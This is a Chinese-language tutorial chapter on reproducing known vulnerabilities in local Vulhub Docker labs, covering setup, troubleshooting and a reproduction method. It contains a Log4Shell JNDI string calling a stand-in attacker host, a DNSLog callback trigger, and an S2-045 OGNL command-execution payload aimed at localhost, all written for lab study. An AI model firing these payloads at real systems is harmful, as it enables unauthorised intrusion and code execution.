---
title: "Vulhub漏洞复现技巧"
type: docs
weight: 4
---

## 四、Vulhub漏洞复现技巧

Vulhub 是安全研究领域最主流的漏洞复现平台，提供超过 200 个预构建的 Docker 漏洞环境，覆盖 Web 应用、中间件、数据库、OA 系统等各类组件。掌握 Vulhub 的使用技巧，能够让你在可控环境中高效复现和研究已知漏洞，是安全从业者的基本功。

### 4.1 平台概览与仓库结构

#### 4.1.1 为什么选择 Vulhub

漏洞复现的核心挑战在于环境搭建：一个 WebLogic 反序列化漏洞可能需要特定版本的 JDK、WebLogic、操作系统配合才能触发。手动搭建这些环境耗时数小时甚至数天，而 Vulhub 通过 Docker Compose 将环境定义为声明式文件，一条命令即可启动完整的靶机环境。

| 对比维度 | 手动搭建 | Vulhub | 其他平台（Vulfocus等） |
|---------|---------|--------|----------------------|
| 搭建耗时 | 数小时 | 1-3 分钟 | 1-2 分钟 |
| 环境一致性 | 依赖本地配置 | Docker 镜像保证一致 | 平台托管 |
| 漏洞覆盖 | 仅限手动能力 | 200+ 官方环境 | 100+ 环境 |
| 离线使用 | 可以 | 需预拉取镜像 | 不支持 |
| 自定义修改 | 完全自由 | 修改 compose 文件 | 受限 |
| 适合场景 | 深度研究 | 快速复现+学习 | 在线演示 |

#### 4.1.2 仓库目录结构

Vulhub 的每个漏洞都是一个独立目录，包含 `docker-compose.yml` 和必要的配置文件。理解目录结构有助于快速定位和修改环境。

```text
vulhub/
├── struts2/                    # Apache Struts2 系列漏洞
│   ├── s2-001/
│   │   ├── docker-compose.yml  # 环境定义
│   │   ├── README.md           # 漏洞说明与复现步骤
│   │   └── target/             # Web 应用文件
│   └── s2-045/
├── weblogic/                   # Oracle WebLogic 系列
│   ├── CVE-2017-10271/
│   ├── CVE-2019-2725/
│   └── CVE-2020-14882/
├── spring/                     # Spring 框架漏洞
├── apache/                     # Apache 服务漏洞（Tomcat、httpd等）
├── fastjson/                   # Fastjson 反序列化
├── redis/                      # Redis 未授权与主从复制
├── thinkphp/                   # ThinkPHP 框架漏洞
├── wordpress/                  # WordPress 插件漏洞
├── docker/                     # Docker 逃逸相关
└── base/                       # 基础镜像（各操作系统、JDK版本等）
```

每个漏洞目录的标准结构：

| 文件 | 作用 | 是否必须 |
|------|------|---------|
| `docker-compose.yml` | 定义服务、端口、挂载 | 必须 |
| `README.md` | 漏洞描述、影响范围、复现步骤 | 推荐 |
| `target/` | Web 应用代码或 WAR 包 | 视漏洞而定 |
| `config/` | 中间件配置文件 | 视漏洞而定 |
| `poc/` | 官方或社区贡献的 PoC | 部分有 |

#### 4.1.3 docker-compose.yml 解析

以经典的 WebLogic CVE-2019-2725 为例，理解一个典型漏洞环境的定义方式：

```yaml
version: '2'
services:
  weblogic:
    image: vulhub/weblogic:12.2.1.3-2018      # 指定中间件版本+补丁级别
    ports:
      - "7001:7001"      # HTTP 端口（外部:容器内）
      - "7002:7002"      # HTTPS 端口
    volumes:
      - ./target:/root/landing                  # 挂载漏洞应用文件
    depends_on:
      - database                                # 依赖的数据库服务
  database:
    image: mysql:5.6                            # 数据库版本固定
    environment:
      MYSQL_ROOT_PASSWORD: "root"               # 初始化密码
      MYSQL_DATABASE: "vulhub"                  # 自动建库
```

关键配置项解析：

- **image**：使用 `vulhub/` 命名空间的定制镜像，预装了特定版本的中间件和补丁状态。如果官方没有对应镜像，可能需要自行构建
- **ports**：端口映射规则。注意某些漏洞可能需要额外端口（如 JNDI 注入的 RMI/LDAP 端口）
- **volumes**：将本地文件挂载进容器，方便修改 Web 应用内容
- **depends_on**：定义服务启动顺序，数据库会先于应用启动

### 4.2 环境准备与快速部署

#### 4.2.1 前置条件

在使用 Vulhub 之前，确保系统满足以下要求：

```bash
# 检查 Docker 版本（需要 18.06+）
docker --version

# 检查 Docker Compose 版本（需要 1.25+）
docker-compose --version

# 检查磁盘空间（建议至少 20GB 可用）
df -h /var/lib/docker

# 检查内存（建议至少 4GB，运行多个环境需要更多）
free -h
```

常见问题排查：

| 问题 | 原因 | 解决方案 |
|------|------|---------|
| `Cannot connect to Docker daemon` | Docker 未启动或当前用户无权限 | `sudo systemctl start docker` 或将用户加入 docker 组 |
| `docker-compose: command not found` | 未安装 Compose | `pip install docker-compose` 或下载二进制 |
| `no space left on device` | 磁盘空间不足 | `docker system prune -a` 清理未使用镜像 |
| `pull access denied` | 镜像不存在或网络问题 | 检查镜像名称，配置镜像加速器 |
| 端口冲突 | 本地端口已被占用 | 修改 docker-compose.yml 中的端口映射 |

#### 4.2.2 安装与配置 Docker

```bash
# Ubuntu/Debian 安装 Docker
curl -fsSL https://get.docker.com | bash -s docker
sudo usermod -aG docker $USER    # 将当前用户加入 docker 组
newgrp docker                     # 立即生效

# 安装 docker-compose
sudo pip3 install docker-compose

# 配置镜像加速器（国内环境推荐）
sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json <<-'EOF'
{
  "registry-mirrors": [
    "https://docker.1ms.run",
    "https://docker.xuanyuan.me"
  ],
  "log-driver": "json-file",
  "log-opts": {
    "max-size": "10m",
    "max-file": "3"
  }
}
EOF
sudo systemctl daemon-reload
sudo systemctl restart docker
```

#### 4.2.3 克隆与选择漏洞环境

```bash
# 完整克隆仓库（约 3-5GB，含所有漏洞定义文件）
git clone https://github.com/vulhub/vulhub.git

# 浅克隆节省空间和时间（只取最新提交，约 500MB）
git clone --depth 1 https://github.com/vulhub/vulhub.git

# 进入特定漏洞目录
cd vulhub/weblogic/CVE-2019-2725

# 查看该漏洞目录下有哪些文件
ls -la
```

快速查找特定漏洞环境的方法：

```bash
# 按 CVE 编号搜索目录名
find ~/vulhub -type d -name "*CVE-2020*"

# 按组件名称搜索
find ~/vulhub -type d -name "*spring*"

# 查看所有可用漏洞目录
ls ~/vulhub/
```

#### 4.2.4 一键启动环境

```bash
# 进入目标漏洞目录
cd ~/vulhub/weblogic/CVE-2019-2725

# 启动环境（首次会拉取镜像，耗时较长）
docker-compose up -d

# 查看启动状态
docker-compose ps

# 查看启动日志（等待 "Server started" 类提示）
docker-compose logs -f

# 验证服务是否就绪
curl -v http://127.0.0.1:7001/console/
```

启动过程中的关键观察点：

1. **镜像拉取阶段**：首次运行时 Docker 会拉取基础镜像，大镜像（如 WebLogic）可能需要 10-30 分钟
2. **服务初始化阶段**：中间件启动需要时间，日志中出现 `Server started in mode: Production` 表示就绪
3. **端口监听确认**：`docker-compose ps` 中 Ports 列显示 `0.0.0.0:7001->7001/tcp` 表示端口映射成功

### 4.3 漏洞复现完整方法论

#### 4.3.1 六步复现法

漏洞复现不是简单地运行 PoC，而是一个系统化的研究过程。以下六步方法论确保每次复现都有深度、有收获：

**第一步：情报收集（15-30 分钟）**

在动手之前，先充分理解漏洞背景：

- 阅读 Vulhub 仓库中该漏洞的 README.md
- 查阅 NVD/CNVD/ CNNVD 上的漏洞详情
- 搜索安全社区的分析文章（先知社区、FreeBuf、Seebug 等）
- 确认漏洞影响组件的精确版本范围

```bash
# 例如研究 CVE-2021-44228（Log4Shell）
# 首先确认受影响版本：Apache Log4j 2.0-beta9 至 2.14.1
# 了解 JNDI 注入机制：${jndi:ldap://attacker.com/exploit}
# 确认触发条件：日志中包含 ${jndi:...} 格式字符串
```

**第二步：环境部署与验证（5-10 分钟）**

```bash
cd ~/vulhub/log4j/CVE-2021-44228
docker-compose up -d
docker-compose ps        # 确认所有容器 Running
docker-compose logs -f   # 确认应用启动完成

# 基础连通性测试
curl http://127.0.0.1:8080/
```

**第三步：漏洞触发与验证（核心环节）**

根据漏洞原理构造最小化触发条件：

```bash
# Log4Shell 触发示例
# 使用 DNSLog 或 Burp Collaborator 观察外连
curl "http://127.0.0.1:8080/?name=\${jndi:ldap://YOUR_DNSLOG_ID.dnslog.cn/test}"
```

关键原则：**先用最简单的 PoC 确认漏洞存在，再逐步增加复杂度。** 不要一上来就写利用链。

**第四步：深入分析（30-60 分钟）**

- 阅读相关源码，定位漏洞根因
- 分析补丁修复方式，理解修复思路
- 思考变通方案：补丁是否可以被绕过？

```bash
# 进入容器查看源码
docker exec -it container_name /bin/bash

# WebLogic 示例：查看补丁 diff
find / -name "*.jar" -path "*wls*" 2>/dev/null
```

**第五步：编写复现报告**

一份合格的复现报告应包含：

```markdown
# CVE-XXXX-XXXXX 漏洞复现报告

## 漏洞概要
- 影响组件与版本
- CVSS 评分与漏洞类型
- 发现时间与公开时间

## 环境搭建
- 硬件/软件要求
- docker-compose 配置说明
- 启动命令与验证方法

## 复现过程
- 触发条件分析
- 具体操作步骤（附截图）
- 预期结果与实际结果对比

## 根因分析
- 漏洞代码位置
- 攻击向量分析
- 利用链构建思路

## 修复方案
- 官方补丁分析
- 临时缓解措施
- 自检脚本/检测规则
```

**第六步：知识沉淀**

- 将有价值的发现整理为笔记或博客
- 为团队编写安全通告模板
- 将改进后的 PoC 提交社区（如有贡献渠道）

#### 4.3.2 常见漏洞类型复现要点

不同类型的漏洞在复现时有不同的关注点：

| 漏洞类型 | 关键配置 | 常见坑点 | 典型代表 |
|---------|---------|---------|---------|
| RCE（远程代码执行） | 需要反弹 Shell 监听 | 防火墙阻断出站流量 | Struts2、WebLogic |
| 反序列化 | JDK 版本严格匹配 | 不同 JDK 版本利用方式不同 | Fastjson、Jackson |
| SQL 注入 | 数据库连接配置 | 某些 WAF 规则可能误拦截 | Discuz、WordPress |
| 文件上传 | 上传目录权限 | 某些容器中路径可能不同 | Spring Boot、Shiro |
| SSRF | 内网模拟环境 | Docker 网络隔离可能导致不通 | Redis、Elasticsearch |
| JNDI 注入 | 恶意 RMI/LDAP 服务 | 需要另起攻击端服务 | Log4Shell、Fastjson |

#### 4.3.3 PoC 编写与调试

复现漏洞的关键环节是编写和调试 PoC。以 Struts2 S2-045（Content-Type 注入）为例演示完整过程：

```bash
# 环境启动
cd ~/vulhub/struts2/s2-045-048
docker-compose up -d
sleep 30  # 等待 Tomcat 完全启动

# 第一轮：确认漏洞存在（最简触发）
curl -v 'http://127.0.0.1:8080/index.action' \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Vuln','S2-045')}.multipart/form-data"

# 检查响应头中是否包含 X-Vuln: S2-045
# 如果有，说明 OGNL 表达式被成功执行

# 第二轮：执行系统命令
curl -v 'http://127.0.0.1:8080/index.action' \
  -H "Content-Type: %{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Command','#cmd=new java.lang.String[]{\"id\"};#rt=new Runtime;#process=#rt.exec(#cmd);#process.waitFor();#is=#process.getInputStream();#sc=new java.util.Scanner(#is);#result=#sc.hasNext()?\n$sc.nextLine():'';#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Result',#result)}.multipart/form-data"

# 检查 X-Result 响应头中的命令输出
```

### 4.4 环境管理进阶

#### 4.4.1 日常运维命令

```bash
# 启动（前台，可实时看日志）
docker-compose up

# 启动（后台守护进程模式）
docker-compose up -d

# 停止并移除容器（不删除数据卷）
docker-compose down

# 停止并清理所有数据（包括数据库数据卷，彻底重来）
docker-compose down -v

# 重启某个服务（不中断其他服务）
docker-compose restart weblogic

# 查看特定服务日志（最近 100 行）
docker-compose logs --tail=100 weblogic

# 实时跟踪日志（类似 tail -f）
docker-compose logs -f

# 查看运行中容器的资源占用
docker stats
```

#### 4.4.2 多环境并行管理

在研究一个攻击链时，经常需要同时运行多个漏洞环境。以下是管理策略：

```bash
# 使用项目名隔离不同研究的环境
cd ~/vulhub/spring/CVE-2022-22947
docker-compose -p spring-rce up -d

cd ~/vulhub/redis/4-unacc
docker-compose -p redis-unacc up -d

# 查看所有运行的容器
docker ps

# 按项目名停止
docker-compose -p spring-rce down
```

命名规则建议：使用 `组件名-漏洞类型` 格式，如 `weblogic-rce`、`redis-unacc`、`struts2-s2045`，便于识别和管理。

#### 4.4.3 资源占用优化

Vulhub 环境会占用大量磁盘和内存，优化策略如下：

```bash
# 查看 Docker 磁盘占用明细
docker system df

# 清理已停止容器和悬空镜像
docker system prune

# 彻底清理（包括未使用的镜像，慎用）
docker system prune -a

# 设置 Docker 日志轮转（防止日志撑爆磁盘）
# 已在 daemon.json 中配置 "max-size": "10m"

# 限制单个容器内存（修改 docker-compose.yml）
# services:
#   weblogic:
#     deploy:
#       resources:
#         limits:
#           memory: 2G
#           cpus: '1.0'
```

#### 4.4.4 容器调试技巧

当环境异常时，进入容器内部排查：

```bash
# 进入运行中的容器
docker exec -it $(docker ps -q --filter "ancestor=vulhub/weblogic") /bin/bash

# 如果容器中没有 bash，使用 sh
docker exec -it container_id /sh

# 查看容器网络连通性
docker exec -it container_id ping 127.0.0.1

# 查看容器内进程
docker exec -it container_id ps aux

# 查看容器环境变量
docker exec -it container_id env

# 查看容器内监听端口
docker exec -it container_id netstat -tlnp

# 如果容器没有 netstat，使用 /proc
docker exec -it container_id cat /proc/net/tcp

# 查看容器资源限制
docker inspect container_id | grep -i mem
```

### 4.5 常见问题与故障排除

#### 4.5.1 启动失败

```text
问题：docker-compose up -d 后容器立即退出
```

排查步骤：

```bash
# 1. 查看退出状态码
docker-compose ps
# Exit Code 含义：0=正常退出, 1=应用错误, 137=被 kill(OOM), 139=段错误

# 2. 查看详细日志
docker-compose logs weblogic

# 3. 常见原因及对策
# - 端口冲突：修改 docker-compose.yml 中的端口映射
# - 磁盘空间不足：df -h 检查，docker system prune 清理
# - 镜像拉取失败：配置镜像加速器
# - 内存不足：减少同时运行的环境数量
```

#### 4.5.2 环境启动成功但漏洞无法触发

```text
问题：docker-compose ps 显示服务正常运行，但 PoC 无效
```

常见原因及解决方案：

| 症状 | 可能原因 | 解决方法 |
|------|---------|---------|
| 连接超时 | 端口映射错误 | 检查 docker-compose.yml ports 配置 |
| 404 错误 | 应用路径不对 | 查看 README 确认正确 URL |
| 500 错误 | 应用未完全启动 | 等待 1-2 分钟后重试 |
| 功能不触发 | JDK 版本不匹配 | 检查镜像标签中的 JDK 版本 |
| 漏洞已修复 | 镜像包含补丁 | 更换不含补丁的镜像版本 |
| 防火墙阻断 | 宿主机防火墙 | `sudo iptables -F` 或添加放行规则 |

#### 4.5.3 网络问题

```bash
# 测试容器间连通性
docker network ls                      # 列出所有 Docker 网络
docker network inspect vulhub_default  # 查看网络配置

# 从宿主机测试容器
curl http://127.0.0.1:7001/console/

# 从容器内测试另一个容器
docker exec -it weblogic ping database

# 如果需要容器访问外网（如 JNDI 注入场景）
# Docker 默认允许容器访问外网，检查宿主机是否开启 IP 转发
cat /proc/sys/net/ipv4/ip_forward  # 应为 1
```

#### 4.5.4 镜像拉取慢或失败

```bash
# 方案一：使用代理
export http_proxy=http://127.0.0.1:7890
export https_proxy=http://127.0.0.1:7890
docker-compose up -d

# 方案二：手动拉取（跳过 docker-compose）
docker pull vulhub/weblogic:12.2.1.3-2018
docker-compose up -d

# 方案三：从国内镜像源拉取
# 已在 daemon.json 中配置，确保生效
docker info | grep -A5 "Registry Mirrors"
```

### 4.6 进阶技巧

#### 4.6.1 自定义环境修改

Vulhub 提供的是通用环境，实际研究中经常需要修改配置：

```bash
# 临时修改环境变量（不改文件）
docker-compose run -e JAVA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5005" weblogic

# 修改 docker-compose.yml 后重新部署
docker-compose down
# 编辑 docker-compose.yml
docker-compose up -d

# 热更新：将修改后的文件挂载到运行中的容器
docker cp custom_exploit.class container_name:/opt/weblogic/
```

#### 4.6.2 快照与环境保存

研究过程中可能需要保存中间状态：

```bash
# 将容器保存为新镜像（含当前状态）
docker commit container_id my-research:vulhub-log4j-step1

# 导出为 tar 文件（可离线传输）
docker save my-research:vulhub-log4j-step1 -o ~/images/log4j-step1.tar

# 从 tar 文件加载
docker load -i ~/images/log4j-step1.tar

# 创建数据卷快照
docker run --rm -v vulhub_data:/source -v $(pwd):/backup alpine \
  tar czf /backup/vulhub_data.tar.gz -C /source .
```

#### 4.6.3 调试 Java 漏洞的远程调试配置

Java 应用漏洞是 Vulhub 最常见的类型。配置远程调试可以深入分析漏洞执行流程：

```yaml
# 修改 docker-compose.yml，添加调试参数
version: '2'
services:
  weblogic:
    image: vulhub/weblogic:12.2.1.3-2018
    ports:
      - "7001:7001"
      - "5005:5005"    # 调试端口
    environment:
      - JAVA_OPTS=-agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=0.0.0.0:5005
```

连接调试器：

```bash
# 使用 Intellij IDEA / Eclipse 的 Remote Debug
# Host: 127.0.0.1, Port: 5005, Module: 对应的项目

# 或使用 jdb 命令行调试
jdb -attach 127.0.0.1:5005
```

#### 4.6.4 批量复现脚本

当需要系统性复现多个同类型漏洞时，批量脚本可以极大提高效率：

```bash
#!/bin/bash
# batch_reproduce.sh - 批量复现指定组件的所有漏洞
# 用法: ./batch_reproduce.sh weblogic

COMPONENT=$1
VULHUB_DIR=~/vulhub

if [ -z "$COMPONENT" ]; then
    echo "用法: $0 <组件名>"
    echo "示例: $0 weblogic"
    exit 1
fi

# 查找该组件下所有漏洞目录
VULN_DIRS=$(find "$VULHUB_DIR/$COMPONENT" -name "docker-compose.yml" -exec dirname {} \;)

for vuln_dir in $VULN_DIRS; do
    vuln_name=$(basename "$vuln_dir")
    echo "=========================================="
    echo "开始复现: $COMPONENT/$vuln_name"
    echo "=========================================="

    cd "$vuln_dir"

    # 启动环境
    docker-compose up -d

    # 等待服务启动
    echo "等待服务启动..."
    sleep 30

    # 检查状态
    if docker-compose ps | grep -q "Exit"; then
        echo "[FAIL] $vuln_name 启动失败"
        docker-compose down -v
        continue
    fi

    echo "[OK] $vuln_name 环境已就绪"
    echo "手动复现完成后按 Enter 清理..."
    read

    # 清理环境
    docker-compose down -v
    cd "$VULHUB_DIR"
done

echo "批量复现完成"
```

#### 4.6.5 构建自定义漏洞环境

当 Vulhub 没有收录你需要的漏洞时，可以参考其模板自行构建：

```yaml
# 自定义漏洞环境模板
version: '2'
services:
  target:
    # 选择基础镜像（或使用 FROM 构建）
    image: vulhub/你的中间件:版本号
    # 如果需要自定义构建
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "目标端口:目标端口"
    volumes:
      - ./poc:/poc           # 挂载 PoC 文件
    environment:
      - DB_HOST=db           # 通过服务名引用其他容器
    depends_on:
      - db
    networks:
      - vulnet

  db:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: vulhub
    networks:
      - vulnet

networks:
  vulnet:
    driver: bridge
```

### 4.7 复现记录模板

每次复现漏洞都应留下完整记录。以下是推荐的记录模板，可以直接作为学习笔记或团队共享文档使用：

```markdown
# [CVE-XXXX-XXXXX] 漏洞复现笔记

## 基本信息
- 漏洞名称：
- 影响组件：（精确到版本号）
- 漏洞类型：（RCE/SQLi/SSRF 等）
- CVSS 评分：
- 公开日期：

## 环境信息
- 操作系统：
- Docker 版本：
- Vulhub 环境路径：

## 复现步骤
1. 启动环境：`cd ~/vulhub/xxx && docker-compose up -d`
2. 触发漏洞：（具体命令/请求）
3. 验证结果：（预期 vs 实际）

## 漏洞分析
### 根因
（简要说明漏洞的根本原因）

### 攻击向量
（攻击者如何利用此漏洞）

### 利用限制
（触发条件、前置要求）

## 修复方案
### 官方补丁
（补丁内容简述）

### 临时缓解
（在打补丁之前的临时措施）

## 相关资源
- NVD 链接：
- 参考文章：
```

### 4.8 安全注意事项

使用 Vulhub 时务必遵循安全规范：

1. **隔离网络**：永远不要在生产网络中运行漏洞环境，使用虚拟机或隔离的 Docker 网络
2. **及时清理**：复现完成后立即 `docker-compose down -v`，不要让漏洞环境长时间暴露
3. **禁止外传**：不要将含有攻击 payload 的文件上传到公共仓库或不可信的平台
4. **授权测试**：仅在授权范围内进行漏洞研究，未授权测试可能触犯法律
5. **资源监控**：漏洞环境可能被攻击者扫描利用，监控异常流量
6. **备份数据**：重要的研究笔记和 PoC 及时备份到安全位置

```bash
# 复现完成后的清理清单
docker-compose down -v      # 停止容器并删除数据卷
docker system prune -af     # 清理悬空镜像和未使用网络
cd ~/vulhub                 # 退出漏洞目录
```

### 4.9 总结

Vulhub 是安全研究和学习的强大工具。掌握其使用技巧的核心在于：理解 Docker Compose 的环境声明方式、遵循系统化的复现方法论、以及做好每次复现的记录和沉淀。从快速部署到深度调试，从单环境管理到批量复现，每个环节都需要实践积累。

记住：**漏洞复现的最终目的不是"跑通 PoC"，而是理解漏洞根因、掌握分析方法、积累安全知识。** 每一次复现都应该是对安全原理的一次深入学习。
